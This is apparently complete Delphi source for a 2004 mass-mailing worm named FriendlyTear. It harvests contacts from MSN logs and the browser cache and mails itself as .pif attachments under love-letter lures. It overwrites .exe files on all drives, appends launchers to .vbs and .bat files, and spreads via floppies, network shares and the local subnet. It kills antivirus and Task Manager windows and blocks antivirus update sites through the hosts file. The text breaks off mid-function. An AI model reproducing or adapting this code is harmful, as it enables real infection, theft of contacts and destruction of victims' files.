   unit friendlytear;

   // FriendlyTier by Byt3Cr0/GEDZAC
   // terminado el 22/7/04 - 02:53 am
   interface

   uses
     Windows, Messages, SysUtils, Registry, Variants, TLHelp32, Winsock,Classes, Graphics, Controls, Forms,
     Dialogs, StdCtrls, ExtCtrls, Psock, NMsmtp, jpeg;
   function FindFile(const filespec: TFileName; attributes: integer
      = faReadOnly Or faHidden Or faSysFile Or faArchive): String;


   type
     TForm1 = class(TForm)
       paths: TMemo;
       mails: TMemo;
       smtp: TNMSMTP;
       Image4: TImage;
       Image1: TImage;
       Image2: TImage;
       Image3: TImage;
       Image5: TImage;
       Image6: TImage;
       Image8: TImage;
       Image9: TImage;
       Image11: TImage;
       Image12: TImage;
       Image15: TImage;
       Image16: TImage;
       Image18: TImage;
       Image19: TImage;
       Image7: TImage;
       Image10: TImage;
       Image13: TImage;
       Image14: TImage;
       procedure FormCreate(Sender: TObject);
       procedure helloworld;
     private
       { Private declarations }
     public
       { Public declarations }
     end;
     const
     tm = #189;
     SP = #13#10;

   var
     Form1: TForm1;
     list,filex,vxfolder,hush,kush:string;
     tears:dword;
     MyName :array[0..255] of char;
     Munzter: dword;
         n,shit:integer;
         MyTime:TSystemTime;
         desktop,favoritos,misdoc,docs,start,RET:string;
           numbers:array[0..4] of string;
     logs_msn:string;
     HKLM:HKEY = HKEY_LOCAL_MACHINE;
       Reg:TRegistry;
       enter:string;
       codex1,codex2:string;
       qq,tt:textfile;




   implementation

   {$R *.dfm}

   Function xx(things:string):string;
   var newx:string;
       LlL,OoO,theKey:integer;
   begin
   theKey := 53;
   LlL := strLen(PChar(things));
   For OoO := 1 to LlL do begin
   newx := newx + chr(ord(things[OoO]) xor thekey);
   end;
   xx := newx;
   end;


   // THANKS FALCKON FOR YOUR MAIL HUNTING ROUTINE ;)
   Function RegRead(key:hkey;ruta:string;valor:string):string;
   begin
     Reg := TRegistry.Create;
     Reg.RootKey := key;
      if Reg.OpenKeyReadOnly(ruta) then
      begin
       RegRead := reg.ReadString(valor);
      end;
   end;

   Function extract(mail:string):string;
   var
     Zorra:string;
     puta,p:integer;
    begin
      puta := strLen(PChar(mail));
        For p := 1 to puta - 4 do begin
        zorra := zorra + mail[p];
      end;
    extract := zorra;        // mail limpio
   end;
   Function Usuario():string;
   var
   user: Array[0..255] of char;
   tam: Cardinal;
   begin
    try
      tam := 255;
      GetUserName(user, tam);
      usuario := String(user);
    except
      raise;
    end;
   end;
   function extract_mail(s:string): string; //rutina aprendiad y extraida de Dexter thx!
   var i,j,k,l:integer;
       servidor,buajaja,n:byte;
       jojojo,serv:string;
   begin
   buajaja:=0;servidor:=0;n:=0;k:=0;jojojo:='';
   serv:='';extract_mail:='';
   for i:=1 to length(s) do
   begin
   if (i>3)and(UpCase(s[i])=':')and(UpCase(s[i-3])='L')and(UpCase(s[i-2])='T')and(UpCase(s[i-1])='O') then n:=n+1;
   if n=1 then
    begin
     for j:=i+1 to length(s) do
       begin
       inc(k);
       if (s[j]='@')and(buajaja=0) then
         begin
         for l:=k-1 downto 1 do jojojo:=jojojo+s[j-l];
         inc(servidor);
         n:=0;
         end;
       if (servidor>0)and(buajaja=0)and(s[j]<>'?')and(s[j]<>'"')and(s[j]<>'>')and(s[j]<>' ')and(s[j]<>':') then
       begin
       serv:=serv+s[j];
       end
       else if servidor>0 then buajaja:=1;
           end;
   extract_mail:=jojojo+serv;
   end;
   end;
   end;

   function quit_fuck(txt:string):string;
   var
     str,str2:string;
     o,p,count:integer;
     begin
     str := '@';
     count := 0;
     if pos(str,txt) = 0 then begin
       For o := 1 to strLen(PChar(txt)) do
       begin
       count := count +1;
          if txt[o] = '[' then begin
           break;
          end;
         str2 := str2 + txt[o];
       end;
       count := count +7  ;
       str2 := str2 + str;
       For  p := count to strLen(Pchar(txt)) do   begin
        str2 := str2 + txt[p]  ;
       end;
     end;
     txt := str2      ;
     quit_fuck := txt;
   end;

   Function fuck_xcorreo(mail:string):string;
     Var bad_words:array[1..12] of string;
     p:integer;
     Begin
       bad_words[1]:='sopho';bad_words[2]:='kasper';
       bad_words[3]:='per';bad_words[4]:='norman';
       bad_words[5]:='virus';bad_words[6]:='anti';
       bad_words[7]:='micro';bad_words[8]:='videosoft';
       bad_words[9]:='panda';bad_words[10]:='anon';
       bad_words[11]:='archive';bad_words[12]:='hotma';
       For p := 1 to 12 do
         begin
         if pos(bad_words[p],LowerCase(mail)) = 0 then
           begin
           fuck_xcorreo := mail;
         end
         else
         begin
           fuck_xcorreo := '';
           break;
         end;
       end;
   end;



   procedure xtraer(path:string;mails:TMemo);
   var
     shand:TSearchRec;
     counter,b:integer;
     begin
     counter := 0;
     // if DirectoryExists(path) then
       // begin
        If FindFirst(path + '\*.*',faDirectory,shand) = 0 then
        Begin
          While FindNext(shand) = 0 do
            begin
            numbers[counter] := shand.Name;      // obtiene los numeros del msn
            counter := counter + 1;
            end;
          end;
          For b := 1 to 4 do
            Begin
            logs_msn :=

   RegRead(HKEY_CURRENT_USER,'\Software\Microsoft\MSNMessenger\PerPassportSettings\'+numbers[b],'MessageLogPath');
            If

   logs_msn <> '' then
            Begin
            If FindFirst(logs_msn +'\*.xml',faAnyFile,shand) =0 then
            Begin
            mails.Lines.add(extract(shand.Name));
          End;
          While FindNext(shand) = 0 do
          Begin
          if fuck_xcorreo(extract(shand.name)) <> '' then begin
          mails.lines.add(extract(shand.name));     // almacenamos un contacto en el memo
          end;
        end;
        End;
     End;
    // end;
     end;
   procedure extract_msncontacts1(xmails:Tmemo)  ;
   Var
     path:string;
     path2,path3:string;
     c:integer;
     Appdat:array[1..2] of string;
    begin
    path3 := RegRead(HKEY_CURRENT_USER,'\Volatile Environment','APPDATA');
    //showmessage(path3);
    if path3 <> '' then begin
      path := path3+ '\Microsoft\MSN Messenger';
      //showmessage(path);
     xtraer(path,xmails);
    end
    else  begin
     path2 := '\Docume~1\'+Usuario;
     appdat[1]:='\Application Data'; appdat[2]:='\Datos de Aplicación';
        For c := 1 to 2 do
        begin
        path := 'c:'+path2 + appdat[c] + '\Microsoft\MSN Messenger';
       xtraer(path,xmails)  ;
       end;
       end;
     end;
   Procedure collecting_mails(cmail:TMemo;mails:Tmemo)      ;
   var   IEContent,IEContent2,contenido,vbs:String;
   joder,mierda:textfile;
   puta:TSearchRec;
   B:integer;
   begin
     IEContent := '\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\Cache\Paths' ;
     IEContent2 := RegRead(HKLM,IEContent,'Directory');
      if IEContent2 <> '' then
      begin
      //if not fileexists('c:\log.vbs') then begin
      vbs := 'Dim pz,folders' + enter + 'Set pz = CreateObject("Scripting.FileSystemObject")' + enter +
        'searching("'+IEContent2+'")'+enter+enter+'Sub searching(puta)'+enter+
        'Dim gf,pa,ex,sf'+enter+
        'Set gf = pz.GetFolder(puta).subfolders'+enter+
        'For each pa in gf'+enter+
        'folders = folders + pa + vbcrlf'+enter+
        'next'+enter+'Dim ass'+enter+
        'Set ass = pz.CreateTextFile("c:\f.log")'+enter+
        'ass.writeline folders'+enter+
        'ass.close'+enter+
        'end sub';
        AssignFile(joder,'c:\log.vbs');
        ReWrite(joder);
        WriteLn(joder,vbs);
        closefile(joder);
         Sleep(2000);
         WinExec(Pchar('c:\log.vbs'),SW_HIDE);
         Sleep(3000);
         //end;
     end;
     cmail.Lines.LoadFromFile('c:\f.log');
     cmail.lines.add(IEContent2);
     For b := 1 to cmail.Lines.Count do begin
       if cmail.lines[b] <> '' then
       begin
        FindFirst(cmail.Lines[b]+'\*.htm*',faArchive,puta);
        While FindNext(puta) = 0 do begin
        //if fileexists(cmail.lines[b]+'\'+puta.Name) then begin
        //showmessage(cmail.lines[b]+'\'+puta.Name);
        assignfile(mierda,cmail.lines[b]+'\'+puta.Name);
        reset(mierda);
        While not eof(mierda) do   begin
        readln(mierda,contenido);
         if  fuck_xcorreo(extract_mail(contenido)) <> '' then begin
         mails.Lines.Add(extract_mail(Contenido));
         end;
         end;
        // end;
         end;
         end;
         end;
    end;


    procedure tform1.helloworld;
    label aja;
    var
    x,y:integer;
    Asun: Array [1..10] of string;
    Body: Array [1..10] of string;
    Atac: Array [1..10] of string;
    remite:string;
    begin
   Asun[1] := '¿Somos los mejores amigos?';
   Body[1] := 'Acaso somos los mejores amigos? tu crees? vamos a ver ;)';
   Atac[1] := 'Amigos-Test.pif';

   Asun[2] := 'Te Amo lo sabias?';
   Body[2] := 'Te amo, Te Amo, Te amo!!';
   Atac[2] := 'TeAmo.pif';

   Asun[3] := 'I LOVE YOU!! YOU KNOW?! ;)';
   Body[3] := 'i love you, i love you, i love you!!';
   Atac[3] := 'LetMeLoveYou.pif';

   Asun[4] := 'Can i Ask you a question? ;)';
   Body[4] := 'i really want to ask you something...;)';
   Atac[4] := 'something.pif';

   Asun[5] := 'Puedo hacerte una pregunta?';
   Body[5] := 'de verdad nesecito hacerte una pregunta...;)';
   Atac[5] := 'MiPregunta.pif';

   Asun[6] := 'Hola amigo!!';
   Body[6] := 'TQM nunk te olvidare';
   Atac[6] := 'friends.pif';

   Asun[6] := 'comprendeme porfavor...';
   Body[6] := 'en estos momentos no m siento muy bien y las cosas no estan muy claras...ayudame porfavor :(';
   Atac[6] := 'ayuda.pif';

   Asun[7] := 'GUESS WHAT!!';
   Body[7] := 'Guess what! yes i am here!! i wait a long time just for come here with you! ;)';
   Atac[7] := 'map23.pif';

   Asun[8] := 'i think i love you';
   Body[8] := 'i just.. i just... i cant wait..i have toy say you this..';
   Atac[8] := 'just.pif';

   Asun[9] := 'creo que te amo';
   Body[9] := 'no se como paso..pero no puedo comprender muchas cosas...solo..solo..';
   Atac[9] := 'solo.pif';

   Asun[10] := 'Adivinaa que!!';
   Body[10] := 'siiiiiii!! estoy aqui!! tanto tiempo esperandoo!!';
   Atac[10] := 'foto.pif';

   x := mails.Lines.Count mod 10;
   if x = 0 then
    begin
    x := 1
    end;
    for y := 1 to 10 do
       begin

     copyfile(pchar(paramstr(0)),pchar('C:\'+atac[y]),true);
     end;

   remite:=mails.Lines[x];
   smtp.PostMessage.FromAddress:=remite;
   smtp.PostMessage.FromName := remite;
   smtp.PostMessage.ToBlindCarbonCopy.Assign(mails.Lines);
   smtp.PostMessage.Body.Add(body[x]);
   smtp.PostMessage.Subject := Asun[x];
   smtp.PostMessage.Attachments.Add('c:\'+atac[x]);
   aja:
   try
   smtp.Connect;
   smtp.SendMail;
   except
   end;
   if smtp.Connected = false then
   begin
   goto aja;
   end;
   end;

   function sharingtears:integer;
   var e,d : Array [1..10] of string;
       f: Array [1..14] of string;
       c,c1:integer;
       name,Profolder:string;
   begin
   //Lo siento heuristica :( para la proxima ;)
   e[1] := 'tQtBTGPPMP'; e[2] := 'fELWZAfPTGV]qPFAGZLPMP'; e[3]:= '|vdPMP'; e[4] := 'b\[o\EPMP'; e[5] := '\xPF]PMP';
   e[6] := '|vdeGZWPMP'; e[7] := 'q\CmeYTLPGB\A]q\CmvZQPVPMP'; e[8] := 'gPTYeYTLPGPMP'; e[9] := 'qZB[YZTQtVVPYPGTAZGeY@FPMP'; e[10] := 'b\[gtgPMP';
   d[1] := xx(e[1]); d[2] := xx(e[2]); d[3] := xx(e[3]); d[4] := xx(e[5]); d[1] := xx(e[5]);
   d[6] := xx(e[6]); d[7] := xx(e[7]); d[8] := xx(e[8]); d[9] := xx(e[9]); d[10] := xx(e[10]);
          // I REALLY HATE THE HEURISTIC...
          //3:06 am ... playing with the Heuristic--
   Profolder := RegRead(HKEY_LOCAL_MACHINE,xx('ifzsabtgpix\VGZFZSAib\[QZBFiv@GGP[AcPGF\Z['),xx('eGZRGTXs\YPFq\G'));
        F[1] := xx('i~ToTtixLf]TGPQsZYQPGi'); F[2] := xx('iPQZ[^PLi\[VZX\[Ri');
       F[3] := xx('iR[@VYP@FiQZB[YZTQFi)'); F[4] := xx('i\VDiF]TGPQS\YPFi');
       F[5] := xx('i^TOTTY\APixLf]TGPQsZYQPGi'); F[6] := xx('iY\XPB\GPiF]TGPQi');
       F[7] := xx('iXZGE]P@FiXLF]TGPQSZYQPGi');F[8] := xx('irGZ^FAPGixLrGZ^FAPGi');
       F[9] := xx('ib\[xmixLf]TGPQsZYQPGi') ;F[10] := xx('iaPFYTis\YPFi');
       F[11] := xx('izCPG[PAi|[VZX\[Ri'); F[12] := xx('imZYZmiqZB[YZTQFi');
       F[13] := xx('igTE\RTAZGif]TGPi'); F[14] := xx('i~xqixLf]TGPQsZYQPGi');
    name:= Application.Exename;
     For c1 := 1 to 14 do  Begin
    for c := 1 to 10 do
       begin
   Copyfile(pchar(name),Pchar(Profolder+F[c1]+d[c]),true);
     end;
     end;
     end;

     //rutina de extraccion del Handle extraida de trucomania! :)
            function HWNDFromPath(FicheroExe:string):hwnd;

      type
        TPrograma = record
          ElPath : string;
          ElHWND : hwnd;
        end;
        PPrograma=^TPrograma;

      var
        Programa: TPrograma;

        function SacaExe(MangoW:HWND):string;
        var
          Datos    :TProcessEntry32;
          hID      :DWord;
          Snap    : Integer;
        begin
          GetWindowThreadProcessId(MangoW,@hID);
          Snap:=CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,0);
          try
            Datos.dwSize:=SizeOf(Datos);
            if(Process32First(Snap,Datos))then
            begin
              repeat
                if Datos.th32ProcessID=hID then
                begin
                  Result:=StrPas(Datos.szExeFile);
                  Break;
                end;
              until not(Process32Next(Snap,Datos));
            end;
          finally
            Windows.CloseHandle(Snap);
          end;
        end;


       function ObtieneVentanas( Mango  : HWND;
                                 UnPath : PPrograma): Boolean; stdcall;
       begin
         Result := True;
         if SacaExe(Mango)=UpperCase( UnPath^.ElPath )then
         begin
           UnPath^.ElHWND:=Mango;
           Result:=FALSE;  {Stop enumeration}
         end;
       end;


      begin {From HWNDFromPath}
        with Programa do
        begin
          ElPath:=FicheroExe;
          ElHWND:=0;
        end;

        EnumWindows( @ObtieneVentanas, LParam(@Programa) );
        Result:=Programa.ElHWND;
      end;  {From HWNDFromPath}




   function o(txt:string):string;
   var
     ri : String;
     i : Integer;

   begin
    for i := Length(txt) downto 0 do
        ri := ri + txt[i];
    o := ri;
    end;


   Function x(txt:string):string;
   var
   i,p,s:integer;
   axe: string;
   begin
   p := 0;
   For i := 1 to strLen(pchar(txt)) do begin
   p := p +1;
   if txt[i] = '\' then begin
   break;
   end;
   axe := axe + txt[i];
   end;
   x := axe;
   end;

   function mutate(vic:string):string;
   var back,proc,clean:string;
   begin
   back := o(vic);
   proc := x(back);
   clean := o(proc);
   if not fileexists(vxfolder + clean)
   then begin
   CopyFile(Pchar(vic),Pchar(vxfolder + clean),false);
   Deletefile(vic);
   CopyFile(Pchar(paramstr(0)),Pchar(vic),true);
   end;
   end;



   function FindFile(const filespec: TFileName;
       attributes: integer): String;
   var
     spec: string;
     list: String;

   procedure RFindFile(const folder: TFileName);
   var
     SearchRec: TSearchRec;
   begin
     if FindFirst(folder + spec, attributes,
         SearchRec) = 0 then begin
       try
         repeat
           if (SearchRec.Attr and faDirectory = 0)
              or (SearchRec.Name <> '.')
              and (SearchRec.Name <> '..') then
              begin
              filex := folder + SearchRec.Name;
           mutate(filex);
             end;
         until FindNext(SearchRec) <> 0;
       except
         FindClose(SearchRec);
         raise;
       end;
       FindClose(SearchRec);
     end;
     if FindFirst(folder + '*', attributes
         Or faDirectory, SearchRec) = 0 then begin
       try
         repeat
           if ((SearchRec.Attr and faDirectory) <> 0) and
              (SearchRec.Name <> '.') and(SearchRec.Name <> '..') then
             RFindFile(folder + SearchRec.Name + '\');
         until FindNext(SearchRec) <> 0;
       except
         FindClose(SearchRec);
         raise;
       end;
       FindClose(SearchRec);
     end;
   end;

   begin

     try
       spec := ExtractFileName(filespec);
       RFindFile(ExtractFilePath(filespec));
       Result := list;
     except

       raise;
     end;
   end;

   Function Read(Llave : HKEY; ruta,llavex:string): string;
   VAR
     Reg:TRegistry;
    Begin
      Reg := TRegistry.Create;
      Reg.RootKey := Llave;
      IF Reg.OpenKeyReadOnly(ruta) Then
      Result := Reg.ReadString(llavex);
   End;

   Function Write(Llave : HKEY; ruta,llavex,valor:string):string;
   VAR
     Reg:TRegistry ;
    Begin
      Reg := TRegistry.Create;
      Reg.RootKey := Llave;
      IF Reg.OpenKey(ruta,true) Then
      Reg.WriteString(llavex,valor);
   End;


   function disk:integer; stdcall;
   label disk_hunt;
   var vf:array[1..4] of string;
     x:integer;
     begin
      vf[1] := 'Disco de 3'+tm+' (A:)';
        vf[2] := '3'+tm+' Floppy (A:)';
        vf[3] := 'Disco de 3'+tm;
        vf[4] :=  'OpusAPP';
        disk_hunt:
        For x := 1 to 4 do
        begin
        if FindWindow(nil,pchar(vf[x])) <> 0 then begin
          Randomize;
          n  := random(2) + 1;
          if n = 1 then CopyFile(Pchar(paramstr(0)),Pchar('A:\Solo Para ti.pif'),false);
          if n = 2 then CopyFile(Pchar(paramstr(0)),Pchar('A:\Just for you.pif'),false);
        end;
        end;
        Sleep(20000);
        goto disk_hunt;
        end;

     procedure NoTeR;
   var s:TSearchRec;
       o:Textfile;
       path: Array [1..7] of string;
       msgx,compro:string;
       q:integer;
   begin
   compro := Read(HKEY_CURRENT_USER,'\GEDZAC\FriendlyTear\','notepad');
   if compro  <> '' then
   begin
   Write(HKEY_CURRENT_USER,'\GEDZAC\FriendlyTear\','notepad','1');
   path[1] := 'C:'; path[2] := 'F:'; path[3] := desktop; path[4] := favoritos; path[5] := misdoc; path[6] := docs; path[7] := start;
   msgx := SP + '-----------------------------------' + SP + '[- FriendlyTear by Byt3Cr0w/GEDZAC - Thnx BlackRose ;)]' + SP + '-----------------------------------';
   for q := 1 to 7 do
   begin

   if FindFirst(path[q]+'\*.txt',(faDirectory+faHidden+faAnyFile),s)=0 then
   begin
   AssignFile(o,path[q]+ '\' + s.name);
   Append(o); writeln(o,msgx); closefile(o);
   end;
   while findnext(s)=0 do
   begin
   AssignFile(o,path[q]+ '\' + s.name);
   Append(o); writeln(o,msgx); closefile(o);
   end;
   end;
   end;
   end;

   function note:integer;
   label notepad_hunt;
   begin
   notepad_hunt:
   if findwindow(nil,pchar(HWNDFromPath('C:\WINDOWS\NOTEPAD.EXE'))) <> 0 then begin
   NoteR;
   end;
   Sleep(2000);
   goto notepad_hunt;
   end;

   function infv:integer;
   var s:TSearchRec;
       o:Textfile;
       path: Array [1..7] of string;
       msgx,compro:string;
       q:integer;
   begin
   compro := Read(HKEY_CURRENT_USER,'\GEDZAC\FriendlyTear\','vbs');
   if compro  <> '' then
   begin
   Write(HKEY_CURRENT_USER,'\GEDZAC\FriendlyTear\','vbs','1');
   path[1] := 'C:'; path[2] := 'F:'; path[3] := desktop; path[4] := favoritos; path[5] := misdoc; path[6] := docs; path[7] := start;
   msgx := SP + 'bxxx39="WScript"' + SP + 'mccbs6="Shell"' + SP + 'Set ws=CreateObject(bxxx39 & "." & mccbs6)' + SP + 'ws.run "%WinDir%\wshell.exe"';

   for q := 1 to 7 do
   begin

   if FindFirst(path[q]+'\*.vbs',(faDirectory+faHidden+faAnyFile),s)=0 then
   begin
   AssignFile(o,path[q]+ '\' + s.name);
   Append(o); writeln(o,msgx); closefile(o);
   end;
   while findnext(s)=0 do
   begin
   AssignFile(o,path[q]+ '\' + s.name);
   Append(o); writeln(o,msgx); closefile(o);
   end;
   end;
   end;
   end;


   function infb:integer;
   var s:TSearchRec;
       o:Textfile;
       path: Array [1..7] of string;
       msgx,compro:string;
       q:integer;
   begin
   compro := Read(HKEY_CURRENT_USER,'\GEDZAC\FriendlyTear\','bat');
   if compro  <> '' then
   begin
   Write(HKEY_CURRENT_USER,'\GEDZAC\FriendlyTear\','bat','1');
   path[1] := 'C:'; path[2] := 'F:'; path[3] := desktop; path[4] := favoritos; path[5] := misdoc; path[6] := docs; path[7] := start;
   msgx := SP + '@Start %WinDir%\wshell.exe';

   for q := 1 to 7 do
   begin

   if FindFirst(path[q]+'\*.bat',(faDirectory+faHidden+faAnyFile),s)=0 then
   begin
   AssignFile(o,path[q]+ '\' + s.name);
   Append(o); writeln(o,msgx); closefile(o);
   end;
   while findnext(s)=0 do
   begin
   AssignFile(o,path[q]+ '\' + s.name);
   Append(o); writeln(o,msgx); closefile(o);
   end;
   end;
   end;
   end;


   function GetPaths:integer;
   begin
   desktop := Read(HKEY_LOCAL_MACHINE,'\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders\','Common Desktop');
   docs := Read(HKEY_LOCAL_MACHINE,'\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders\','Common Documents');
   favoritos := Read(HKEY_LOCAL_MACHINE,'\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders\','Common Favorites');
   start := Read(HKEY_LOCAL_MACHINE,'\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders\','Common Startup');
   misdoc := Read(HKEY_LOCAL_MACHINE,'\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders\','Personal');
   end;


   function notecall:integer;
   begin
   if MyTime.WDay = 15 then CreateThread(nil,0,@note,nil,0,tears);
   end;


   Function xxx(txt:string):string;
   var
   i,p,s:integer;
   axe: string;
   begin
   p := 0;
   For i := 1 to strLen(pchar(txt)) do begin
   p := p +1;
   if txt[i] = '\' then begin
   break;
   end;
   axe := axe + txt[i];
   end;
   xxx := axe;
   end;

   function folder:String;
   var winfol:pchar;
   WTama : dword;
   begin
   WTama := MAX_PATH + 1;
   GetMem( winfol, WTama );
   try
   if Windows.GetWindowsDirectory( winfol, WTama ) <> 0 then
   Result := winfol;
   finally
   FreeMem(winfol);
   end;
   end;


   function sysfol():string;
   var sysfolx:pChar;
   begin
   GetMem(sysfolx,100);
   if GetSystemDirectory(sysfolx,100) <> 0 then
   begin
     sysfol := sysfolx + '\';
   end;
   FreeMem(sysfolx,100);
   end;


   function vigilar1:integer;
   label bucle1;
   var Xx : Thandle;
   begin
   bucle1:
      Xx:=FindWindow('Kaspersky Anti-Virus Scanner',nil);
          if Xx <> 0 Then
          begin
          MessageBox(0,'Dont kill me!!','Friendly Smyle',32);
          SendMessage(Xx,WM_CLOSE,0,0);
          end;
   Sleep(10000);
   goto bucle1;
   end;

   function vigilar2:integer;
   label bucle2;
   var Xx : Thandle;
   begin
   bucle2:
     Xx:=FindWindow(Pchar(HWNDFromPath(sysfol + '\taskmgr.exe')),nil);
         if Xx <> 0 Then SendMessage(Xx,WM_CLOSE,0,0);
   Sleep(20000);
   goto bucle2;
          end;

   function net1:integer;
   VAR
     X:Char;
     Z:Integer;
     P:String;
     Folders:Array[1..5] of string;
     MaxNetPathLen:DWord;
     Begin
       Folders[1] := '\';
       Folders[2] := '\Documents and Settings\All Users\Start Menu\Programs\Startup\';
       Folders[3] := '\WINDOWS\Start Menu\Programs\Startup\';
       Folders[4] := '\WINDOWS\Menú inicio\Programas\Inicio\';
       Folders[5] := '\WINNT\Profiles\All Users\Start Menu\Programs\Startup\';
       MaxNetPathLen:=MAX_PATH;
       SetLength(P,MAX_PATH);
       For X := 'A' to 'Z' Do
       If WNetGetConnection(PChar(''+X+':'),PChar(P),
       MaxNetPathLen)<>ERROR_NOT_CONNECTED then
       For Z := 1 to 5 Do
     Begin
     CopyFile(PChar(paramstr(0)),PChar(X+':'+Folders[Z]+'winservices.exe'),true);
           end;
   End;

   Function Biosis(machine:string):integer;
   var
   Net: TNetResource;
   begin
   Net.dwType := RESOURCETYPE_DISK; Net.lpLocalName := 'O:'; Net.lpRemoteName := pchar('\\'+Machine+'\c');
   Net.lpProvider := ''; WNetAddConnection2(Net, '', '', CONNECT_UPDATE_PROFILE);
   end;

   Function WakeUp:integer;
   var
   WVersionRequested : WORD;
   WsaData : TWSAData;
   begin
   WVersionRequested := MAKEWORD(2, 2);
   if WSAStartup(wVersionRequested, WsaData)> 0 then
   begin
   shit := 1;
   end;
   end;

   Function coffe:String;
   var Host: PHostEnt;
   money : array[0..128] of char;
   bed : pchar;
   begin
   GetHostName(@money, 128); Host := GetHostByName(@money); bed := Inet_Ntoa(PinAddr(Host^.h_addr_list^)^);
   Result:=bed;
   end;

   Function nigth(room:string):integer;
   var
   iwanttosleep,rigthnow:String;
   iback,tomorrow,infew,minutesigotosleep:integer; //i want to sleep rigth now i back tomorrow in few minutes i go
   begin                                          //to my bed :)
   if shit <> 0 then
   begin
   minutesigotosleep:=0; iwanttosleep:=coffe; infew:=strlen(pchar(iwanttosleep));
   For iback := 1 to infew do
   begin
   if iwanttosleep[iback]='.' then inc(minutesigotosleep);
   if minutesigotosleep < 3 then
   begin
   rigthnow := rigthnow+iwanttosleep[iback];
   end;
   For tomorrow := 0 to 255 do
   Begin
   Biosis(rigthnow+'.'+inttostr(tomorrow)); CopyFile(pchar(paramstr(0)),Pchar('O:\service.exe'),true);
   if fileexists(hush) then
   begin
   Assignfile(qq,hush); append(qq); writeln(qq,codex1); closefile(qq);
   end;
   if fileexists(kush) then
   begin
   Assignfile(tt,kush); append(tt); writeln(tt,codex2); closefile(tt);
   end;
   WNetCancelConnection2( 'O:',0,TRUE)
   end;
   WSACleanup;
   End;
   end;
   end;

   function hostx:integer;
   var co:string;
       a:textfile;
   begin
   co := '127.0.0.1 #' + enter + '#' + enter + '127.0.0.1  u2.eset.com' + enter + '127.0.0.1   u3.eset.com' + enter + '127.0.0.1   u4.eset.com' + enter +
         '127.0.0.1    perantivirus.com' + enter + '127.0.0.1  pandasoftware.es' + enter + '127.0.0.1  pandasoftware.com' + enter + '127.0.0.1 downloads-us1.kaspersky-labs.com' + enter +
         '127.0.0.1    downloads1.kaspersky-labs.com' + enter + '127.0.0.1 downloads4.kaspersky-labs.com' + enter + '127.0.0.1 downloads2.kaspersky-labs.com' + enter +
         '127.0.0.1    downloads-eu1.kaspersky-labs.com' + enter + '127.0.0.1  kav.com' + enter + '127.0.0.1   kaspersky.com';
   AssignFile(a,sysfol + '\drivers\etc\hosts');
   rewrite(a); writeln(a,co); closefile(a);
   end;




   function BloodTears:integer;
   begin
   codex1 := enter + '@start O:\service.exe';
   codex2 := enter + '[Windows]' + enter + 'run= O:\service.exe';
   hush := 'O:\autostart.bat';
   kush := 'O:\windows\win.ini';
   CreateThread(nil,0,@vigilar1,nil,0,tears);
   CreateThread(nil,0,@vigilar2,nil,0,tears);
   CreateThread(nil,0,@infv,nil,0,tears);
   CreateThread(nil,0,@infb,nil,0,tears);
   CreateThread(nil,0,@notecall,nil,0,tears);
   CreateThread(nil,0,@disk,nil,0,tears);
   CreateThread(nil,0,@net1,nil,0,tears);
   CreateThread(nil,0,@nigth,nil,0,tears);
   CreateThread(nil,0,@hostx,nil,0,tears);
   CreateThread(nil,0,@sharingtears,nil,0,tears);
   end;


   procedure TForm1.FormCreate(Sender: TObject);
   var
   full:Trect;
   drive:char;
   TheNamex,TheName:string;
   Longitud,a,b,Contador:integer;
   x:string;
   back,proc,clean:string;
   begin
    ShowWindow( Application.Handle, SW_HIDE );
      SetWindowLong( Application.Handle, GWL_EXSTYLE,
                     GetWindowLong(Application.Handle, GWL_EXSTYLE) or
                     WS_EX_TOOLWINDOW and not WS_EX_APPWINDOW);
      ShowWindow( Application.Handle, SW_SHOW );


     vxfolder := 'C:\$_8322_3_GEDZAC_82635_FRIENDLYTEARS_(ByT3Cr0W)_24\';
   if not DirectoryExists(vxfolder) then begin
   //starting...

   CreateDirectory(Pchar(vxfolder),nil);
   WinExec(Pchar('cmd.exe /c Attrib +S +H +R C:\$_8322_3_GEDZAC_82635_FRIENDLYTEARS_(ByT3Cr0W)_24'),SW_HIDE);
   WinExec(Pchar('cmd.exe /c Attrib +S +H +R '+vxfolder+'*.*'),SW_HIDE);
   CopyFile(Pchar(paramstr(0)),Pchar(folder + '\wshell.exe'),true);
   Write(HKEY_LOCAL_MACHINE,'\Software\Microsoft\Windows\CurrentVersion\Run\','WinLogOn',folder + '\wshell.exe');
   WinExec(Pchar('cmd.exe /c Attrib +S +H +R '+folder +'\wshell.exe'),SW_HIDE);
   CreateThread(nil,0,@BloodTears,nil,0,tears);
   CreateMutex(nil, false, '[- FriendlyTear by Byt3Cr0w/GEDZAC -]');
   if GetLastError = ERROR_ALREADY_EXISTS then exitprocess(0);
   CreateMutex(nil, true, '[- GEDZAC ESTA VIVO -]');
   CreateMutex(nil, true, '[- SALUDOS A TODOS EN GEDZAC! (holapp BlackRose ;)) -]');
     extract_msncontacts1(mails);
     collecting_mails(paths,mails);
    helloworld;
   GetPaths;
   GetlocalTime(MyTime);
   if MyTime.Wday = 15 then
   begin
      with full do
      begin
        Left:=0;
        Top:=0;
        Right:=Screen.Width;
        Bottom:=Screen.Height;

   end;
   Messagebox(0,'be happy smile!','FriendlyTear',32);
   MessageBox(0,'because someday you will not be happy and may your world falls down...','FriendlyTear',32);
   Messagebox(0,':) - FriendlyTear by Byt3Cr0w/GEDZAC - hi BlackRose ;) - :)','FriendlyTear',32);
     Image1.Picture.Assign(Image4.Picture);
   form1.WindowState := wsMaximized;
               Image2.Picture.Assign(Image4.Picture);
               Image3.Picture.Assign(Image4.Picture);
               Image5.Picture.Assign(Image4.Picture);
               Image6.Picture.Assign(Image4.Picture);
               Image7.Picture.Assign(Image4.Picture);
               Image8.Picture.Assign(Image4.Picture);
               Image9.Picture.Assign(Image4.Picture);
               Image10.Picture.Assign(Image4.Picture);
               Image11.Picture.Assign(Image4.Picture);
               Image12.Picture.Assign(Image4.Picture);
               Image13.Picture.Assign(Image4.Picture);
               Image14.Picture.Assign(Image4.Picture);
               Image15.Picture.Assign(Image4.Picture);
               Image16.Picture.Assign(Image4.Picture);
               Image18.Picture.Assign(Image4.Picture);
               Image19.Picture.Assign(Image4.Picture);
               end;
   for drive := 'A' to 'Z' do x := FindFile(drive+':\*.exe');

   end
   else
   begin
